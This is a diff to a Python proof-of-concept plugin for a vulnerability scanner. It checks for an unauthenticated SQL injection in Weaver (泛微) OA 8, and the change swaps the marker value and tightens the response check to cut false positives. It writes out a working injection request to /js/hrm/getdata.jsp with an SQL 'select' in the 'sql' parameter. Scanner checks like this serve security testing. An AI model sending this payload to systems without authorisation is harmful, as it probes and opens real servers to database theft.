@@ -9,12 +9,12 @@ urllib3.disable_warnings()
 class POC(POCBase):
 
     _info = {
-        "author" : "hansi",                      # POC作者
-        "version" : "1",                    # POC版本，默认是1  
+        "author" : "hansi & jijue",                      # POC作者
+        "version" : "2",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        全量POC模式下误报率较高  
+        原POC在全量POC模式下误报率高，现已基本解决该问题  
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "泛微 OA 8 前台SQL注入",                        # 漏洞名称
@@ -45,20 +45,21 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20123456789%20as%20id" # url自己按需调整
+        url = self.target + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%201485960493823869%20as%20id" # url自己按需调整
         
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
                     # "Content-Type": "application/x-www-form-urlencoded",
                     }
-        
+
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req.status_code == 200 and "123456789" in req.text:
+
+            if req.status_code == 200 and "1485960493823869" in req.text and len(req.text.strip()) == 16:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
